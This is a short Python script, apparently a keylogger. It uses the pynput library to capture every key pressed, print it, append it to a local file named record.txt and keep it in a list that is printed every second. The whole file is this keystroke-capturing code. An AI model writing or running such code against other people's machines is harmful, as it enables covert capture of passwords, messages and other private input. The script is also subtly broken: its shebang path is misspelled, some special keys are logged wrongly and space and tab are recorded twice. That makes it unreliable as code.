#!/uysr/bin/env python

from pynput import keyboard
import time

strokes = []

def Press(key):
    #
    handler = open("record.txt",'a')
    #
    try:
        #
        if(key):
            #
            print(key.char)
            #
            keystroke = key.char
            #
            handler.write(keystroke)
            #
            strokes.append(keystroke)
            #
    except AttributeError:
        #
        print(key)
        #
        if(key == key.space):
            #
            keystroke = ' '
            #
            handler.write(keystroke)
            #
            strokes.append(keystroke)
            #
        elif(key == key.tab):
            #
            keystroke = '    '
            #
            handler.write(keystroke)
            #
            strokes.append(keystroke)
            #
        strokes.append(keystroke)
        #
    finally:
        #
        handler.close()

def main():
    #
    listener = keyboard.Listener(on_press=Press)
    #
    listener.start()
    
if(__name__ == '__main__'):
    #
    main()
    #
    while(True):
        #
        for i in range(0,len(strokes)):
            #
            print(strokes[i])
            #
        time.sleep(1)
